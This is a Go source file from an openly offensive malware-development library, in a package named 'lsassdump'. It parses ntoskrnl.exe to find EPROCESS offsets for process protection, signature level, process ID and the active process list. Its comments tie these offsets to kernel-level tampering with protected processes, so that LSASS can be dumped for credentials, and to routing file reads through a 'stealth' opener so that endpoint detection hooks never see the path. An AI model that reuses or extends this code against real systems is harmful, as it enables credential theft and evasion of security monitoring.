package lsassdump

import (
	"debug/pe"
	"encoding/binary"
	"errors"
	"fmt"
	"io"

	"github.com/oioio-space/maldev/evasion/stealthopen"
)

// Dynamic EPROCESS offset discovery.
//
// EPROCESS layout shifts every cumulative update — Microsoft never
// promises ABI stability. v0.x of this package required operators to
// hand-curate PPLOffsetTable per build, which doesn't scale.
//
// Inspired by wesmar/kvc (MIT) — the OffsetFinder there reads
// ntoskrnl.exe in user-mode and extracts the EPROCESS.Protection
// offset from the first instruction of `PsIsProtectedProcess` and
// `PsIsProtectedProcessLight`. Both kernel exports compile to a
// trivial wrapper:
//
//	PsIsProtectedProcess:
//	  movzx eax, byte ptr [rcx + EPROCESS.Protection_offset]
//	  test  eax, eax
//	  setnz al
//	  ret
//
// The first three bytes are always `0F B6 81` (movzx eax, byte ptr
// [rcx+disp32]) on x64; the next 4 bytes are the disp32 = the
// EPROCESS.Protection field offset. Extracting it requires no
// kernel-mode read — just parse ntoskrnl.exe as a PE on disk.
//
// kvc is MIT-licensed, so we cite it directly in source comments
// and reuse the technique. maldev stays MIT.
//
// SignatureLevel sits 2 bytes before Protection; SectionSignatureLevel
// sits 1 byte before. The PsIsProtectedProcess offset alone gives us
// all three.

// ErrProtectionOffsetNotFound fires when the parser couldn't locate
// the PsIsProtectedProcess export OR the function's prologue didn't
// match the expected `0F B6 81 disp32` pattern.
var ErrProtectionOffsetNotFound = errors.New("lsassdump: PsIsProtectedProcess prologue did not match the expected `movzx eax, [rcx+disp32]` pattern")

// DiscoverProtectionOffset reads ntoskrnl.exe at `path` and returns
// the EPROCESS.Protection byte offset.
//
// On Windows the canonical path is
// `%SystemRoot%\System32\ntoskrnl.exe`; pass an empty string to
// pick that up via os.Getenv("SystemRoot"). On Linux/CI you supply
// a captured ntoskrnl.exe explicitly (the parser is pure Go via
// debug/pe — no Windows runtime dependency).
//
// `opener` is the optional stealthopen.Opener — pass nil for plain
// os.Open, non-nil to route the read through a stealth strategy
// (NTFS Object ID, etc.) so a path-based EDR file hook never sees
// the ntoskrnl.exe path.
//
// The returned offset cross-validates `PsIsProtectedProcess` and
// `PsIsProtectedProcessLight` — both exports MUST agree (they
// compile to identical wrappers around the same EPROCESS field).
// A mismatch surfaces as ErrProtectionOffsetNotFound to refuse
// shipping a wrong value.
func DiscoverProtectionOffset(path string, opener stealthopen.Opener) (uint32, error) {
	path, err := defaultNtoskrnlPath(path, "DiscoverProtectionOffset")
	if err != nil {
		return 0, err
	}

	f, err := stealthopen.Use(opener).Open(path)
	if err != nil {
		return 0, fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()

	pf, err := pe.NewFile(f)
	if err != nil {
		return 0, fmt.Errorf("parse %s: %w", path, err)
	}
	defer pf.Close()

	offA, err := extractProtectionOffset(f, pf, "PsIsProtectedProcess")
	if err != nil {
		return 0, fmt.Errorf("PsIsProtectedProcess: %w", err)
	}
	offB, err := extractProtectionOffset(f, pf, "PsIsProtectedProcessLight")
	if err != nil {
		return 0, fmt.Errorf("PsIsProtectedProcessLight: %w", err)
	}
	if offA != offB {
		return 0, fmt.Errorf("%w: PsIsProtectedProcess=%d != PsIsProtectedProcessLight=%d",
			ErrProtectionOffsetNotFound, offA, offB)
	}
	// Sanity bound — every documented build keeps the field under 0x1000.
	if offA == 0 || offA > 0x1500 {
		return 0, fmt.Errorf("%w: extracted offset 0x%X out of plausible range",
			ErrProtectionOffsetNotFound, offA)
	}
	return offA, nil
}

// SignatureLevelOffset returns EPROCESS.SignatureLevel given the
// EPROCESS.Protection offset. Per kvc's OffsetFinder, SignatureLevel
// always precedes Protection by 2 bytes. Stable Vista → 25H2.
func SignatureLevelOffset(protectionOff uint32) uint32 {
	return protectionOff - 2
}

// SectionSignatureLevelOffset returns EPROCESS.SectionSignatureLevel
// given the EPROCESS.Protection offset. Always precedes Protection
// by 1 byte.
func SectionSignatureLevelOffset(protectionOff uint32) uint32 {
	return protectionOff - 1
}

// DiscoverUniqueProcessIdOffset reads ntoskrnl.exe at `path` and
// returns the EPROCESS.UniqueProcessId byte offset. Extracted from
// the first instruction of PsGetProcessId, which always compiles to:
//
//	mov rax, qword ptr [rcx + EPROCESS.UniqueProcessId_offset]
//	ret
//
// On x64 that's `48 8B 81 [disp32]` — REX.W + MOV + ModR/M for
// `[rcx+disp32]`. The disp32 starts at file offset 3 of the function.
//
// Empty path defaults to %SystemRoot%\System32\ntoskrnl.exe (same
// convention as DiscoverProtectionOffset). `opener` is the optional
// stealthopen.Opener — pass nil for plain os.Open.
func DiscoverUniqueProcessIdOffset(path string, opener stealthopen.Opener) (uint32, error) {
	path, err := defaultNtoskrnlPath(path, "DiscoverUniqueProcessIdOffset")
	if err != nil {
		return 0, err
	}

	f, err := stealthopen.Use(opener).Open(path)
	if err != nil {
		return 0, fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()

	pf, err := pe.NewFile(f)
	if err != nil {
		return 0, fmt.Errorf("parse %s: %w", path, err)
	}
	defer pf.Close()

	rva, err := findExportRVA(pf, "PsGetProcessId")
	if err != nil {
		return 0, fmt.Errorf("PsGetProcessId: %w", err)
	}
	sec := sectionForRVA(pf, rva)
	if sec == nil {
		return 0, fmt.Errorf("RVA 0x%X not in any section", rva)
	}
	fileOff := int64(sec.Offset) + int64(rva) - int64(sec.VirtualAddress)

	prologue := make([]byte, 7)
	if _, err := f.ReadAt(prologue, fileOff); err != nil {
		return 0, fmt.Errorf("read PsGetProcessId prologue @0x%X: %w", fileOff, err)
	}
	// 48 8B 81 [disp32]: REX.W + mov r64, r/m64 + ModR/M [rcx+disp32].
	if prologue[0] == 0x48 && prologue[1] == 0x8B && isModRMRcxDisp32(prologue[2]) {
		off := binary.LittleEndian.Uint32(prologue[3:7])
		if off == 0 || off > 0x1500 {
			return 0, fmt.Errorf("%w: PsGetProcessId disp32 0x%X out of plausible range",
				ErrProtectionOffsetNotFound, off)
		}
		return off, nil
	}
	return 0, fmt.Errorf("%w: PsGetProcessId prologue %02X %02X %02X (want 48 8B [ModR/M])",
		ErrProtectionOffsetNotFound, prologue[0], prologue[1], prologue[2])
}

// DiscoverActiveProcessLinksOffset returns the EPROCESS.ActiveProcessLinks
// byte offset given the UniqueProcessId offset. ActiveProcessLinks is
// always sizeof(HANDLE) bytes after UniqueProcessId on x64 (= +8).
//
// Stable Vista → Win 11 25H2 per kvc's OffsetFinder; the relative
// position has never shifted because ActiveProcessLinks sits in the
// same struct slot pypykatz / mimikatz / Volatility all assume.
func DiscoverActiveProcessLinksOffset(uniqueProcessIDOff uint32) uint32 {
	return uniqueProcessIDOff + 8 // sizeof(HANDLE) on x64
}

// DiscoverInitialSystemProcessRVA returns the RVA of the
// `PsInitialSystemProcess` export inside ntoskrnl.exe. The export
// is a global pointer (PEPROCESS) — at runtime, reading 8 bytes at
// `ntoskrnl_kernel_base + RVA` via a kernel-mode ReadWriter yields
// the System process's EPROCESS, the head of the
// `PsActiveProcessLinks` doubly-linked list.
//
// Empty path defaults to %SystemRoot%\System32\ntoskrnl.exe.
// `opener` is the optional stealthopen.Opener — pass nil for plain
// os.Open.
func DiscoverInitialSystemProcessRVA(path string, opener stealthopen.Opener) (uint32, error) {
	path, err := defaultNtoskrnlPath(path, "DiscoverInitialSystemProcessRVA")
	if err != nil {
		return 0, err
	}

	f, err := stealthopen.Use(opener).Open(path)
	if err != nil {
		return 0, fmt.Errorf("open %s: %w", path, err)
	}
	defer f.Close()

	pf, err := pe.NewFile(f)
	if err != nil {
		return 0, fmt.Errorf("parse %s: %w", path, err)
	}
	defer pf.Close()

	return findExportRVA(pf, "PsInitialSystemProcess")
}

// extractProtectionOffset finds `name` in the PE's exports, reads
// the first ~8 bytes of that function from .text, and returns the
// disp32 from a `[rcx+disp32]`-targeted instruction. Modern x64
// kernel emits one of three lowerings (compiler-dependent):
//
//	movzx eax, byte ptr [rcx+disp32]   →  0F B6 [ModR/M] [disp32]
//	test  byte ptr [rcx+disp32], imm8  →  F6    [ModR/M] [disp32] [imm8]
//	mov   r8,  byte ptr [rcx+disp32]   →  8A    [ModR/M] [disp32]
//
// All three reference EPROCESS.Protection at the same byte offset.
// The ModR/M byte is `10 rrr 001` for any [rcx+disp32] memory
// operand — values 0x81, 0x89, 0x91, 0x99 cover the common reg
// fields (AX/AL, CX/CL, DX/DL, BX/BL).
//
// On Win 10 22H2 build 19045 we observed:
//   - PsIsProtectedProcess       → `F6 81 …` (test)
//   - PsIsProtectedProcessLight  → `8A 91 …` (mov dl)
//
// Both decoded to the same disp32 = EPROCESS.Protection offset.
func extractProtectionOffset(f io.ReaderAt, pf *pe.File, name string) (uint32, error) {
	rva, err := findExportRVA(pf, name)
	if err != nil {
		return 0, err
	}

	sec := sectionForRVA(pf, rva)
	if sec == nil {
		return 0, fmt.Errorf("RVA 0x%X not in any section", rva)
	}
	fileOff := int64(sec.Offset) + int64(rva) - int64(sec.VirtualAddress)

	prologue := make([]byte, 8)
	if _, err := f.ReadAt(prologue, fileOff); err != nil {
		return 0, fmt.Errorf("read prologue @0x%X: %w", fileOff, err)
	}

	// Two-byte opcode (0F xx): movzx and friends. ModR/M sits at
	// offset 2; disp32 follows at offset 3.
	if prologue[0] == 0x0F && isModRMRcxDisp32(prologue[2]) {
		return binary.LittleEndian.Uint32(prologue[3:7]), nil
	}
	// One-byte opcode: test (F6) / mov (8A, 8B, 88, 89). ModR/M sits
	// at offset 1; disp32 follows at offset 2.
	if isModRMRcxDisp32(prologue[1]) {
		return binary.LittleEndian.Uint32(prologue[2:6]), nil
	}
	return 0, fmt.Errorf("%w: prologue %02X %02X %02X (no [rcx+disp32] addressing form recognised)",
		ErrProtectionOffsetNotFound, prologue[0], prologue[1], prologue[2])
}

// isModRMRcxDisp32 reports whether b is a ModR/M byte that encodes
// `[rcx + disp32]` for ANY reg field. Bit pattern: `10 rrr 001`
// (mod=10 → 32-bit displacement; rm=001 → RCX). Mask 0xC7 isolates
// the mod + rm bits; the comparison value 0x81 is `mod=10, rm=001`.
func isModRMRcxDisp32(b byte) bool {
	return (b & 0xC7) == 0x81
}

// findExportRVA parses the IMAGE_EXPORT_DIRECTORY by hand to locate
// `name`. debug/pe doesn't expose exported symbols directly on x64
// PE files; we walk the directory ourselves. Stable across every
// PE32+ kernel image we've seen.
func findExportRVA(pf *pe.File, name string) (uint32, error) {
	oh, ok := pf.OptionalHeader.(*pe.OptionalHeader64)
	if !ok {
		return 0, fmt.Errorf("not a PE32+ image (need x64 ntoskrnl)")
	}
	if len(oh.DataDirectory) < 1 {
		return 0, fmt.Errorf("no data directories")
	}
	exportDir := oh.DataDirectory[0]
	if exportDir.VirtualAddress == 0 || exportDir.Size == 0 {
		return 0, fmt.Errorf("export directory empty")
	}

	// Walk to find the section that holds the export directory.
	sec := sectionForRVA(pf, exportDir.VirtualAddress)
	if sec == nil {
		return 0, fmt.Errorf("export directory RVA 0x%X not in any section", exportDir.VirtualAddress)
	}
	secData, err := sec.Data()
	if err != nil {
		return 0, fmt.Errorf("read export section: %w", err)
	}

	// IMAGE_EXPORT_DIRECTORY layout (40 bytes):
	//   +0x00 Characteristics      uint32
	//   +0x04 TimeDateStamp        uint32
	//   +0x08 MajorVersion         uint16
	//   +0x0A MinorVersion         uint16
	//   +0x0C Name                 uint32
	//   +0x10 Base                 uint32
	//   +0x14 NumberOfFunctions    uint32
	//   +0x18 NumberOfNames        uint32
	//   +0x1C AddressOfFunctions   uint32
	//   +0x20 AddressOfNames       uint32
	//   +0x24 AddressOfNameOrdinals uint32
	dirStart := exportDir.VirtualAddress - sec.VirtualAddress
	if uint32(len(secData)) < dirStart+40 {
		return 0, fmt.Errorf("export directory truncated")
	}
	d := secData[dirStart : dirStart+40]
	numNames := binary.LittleEndian.Uint32(d[0x18:0x1C])
	addrFns := binary.LittleEndian.Uint32(d[0x1C:0x20])
	addrNames := binary.LittleEndian.Uint32(d[0x20:0x24])
	addrOrds := binary.LittleEndian.Uint32(d[0x24:0x28])

	// AddressOfFunctions: array of `NumberOfFunctions` × uint32 RVAs.
	// AddressOfNames: array of `NumberOfNames` × uint32 RVAs to ASCII strings.
	// AddressOfNameOrdinals: array of `NumberOfNames` × uint16 ordinal indexes.
	for i := uint32(0); i < numNames; i++ {
		nameRVA := readU32At(secData, sec.VirtualAddress, addrNames+i*4)
		ord := readU16At(secData, sec.VirtualAddress, addrOrds+i*2)
		fnRVA := readU32At(secData, sec.VirtualAddress, addrFns+uint32(ord)*4)

		exportName := readAsciizAt(secData, sec.VirtualAddress, nameRVA)
		if exportName == name {
			return fnRVA, nil
		}
	}
	return 0, fmt.Errorf("export %q not found", name)
}

// sectionForRVA returns the PE section whose virtual range covers
// the given RVA, or nil if no section matches. Callers handle nil
// — corrupt PEs or RVAs into sparse sections fall through cleanly.
func sectionForRVA(pf *pe.File, rva uint32) *pe.Section {
	for _, s := range pf.Sections {
		if rva >= s.VirtualAddress && rva < s.VirtualAddress+s.VirtualSize {
			return s
		}
	}
	return nil
}

// readU32At reads a uint32 from secData at the given absolute RVA,
// translating via secVA (the section's virtual address). Returns
// 0 on out-of-bounds.
func readU32At(secData []byte, secVA, rva uint32) uint32 {
	off := int64(rva) - int64(secVA)
	if off < 0 || off+4 > int64(len(secData)) {
		return 0
	}
	return binary.LittleEndian.Uint32(secData[off : off+4])
}

// readU16At reads a uint16 from secData at the given absolute RVA.
func readU16At(secData []byte, secVA, rva uint32) uint16 {
	off := int64(rva) - int64(secVA)
	if off < 0 || off+2 > int64(len(secData)) {
		return 0
	}
	return binary.LittleEndian.Uint16(secData[off : off+2])
}

// readAsciizAt reads a null-terminated ASCII string from secData
// at the given RVA. Caps at 256 bytes.
func readAsciizAt(secData []byte, secVA, rva uint32) string {
	off := int64(rva) - int64(secVA)
	if off < 0 || off >= int64(len(secData)) {
		return ""
	}
	end := off
	max := off + 256
	if max > int64(len(secData)) {
		max = int64(len(secData))
	}
	for end < max && secData[end] != 0 {
		end++
	}
	return string(secData[off:end])
}
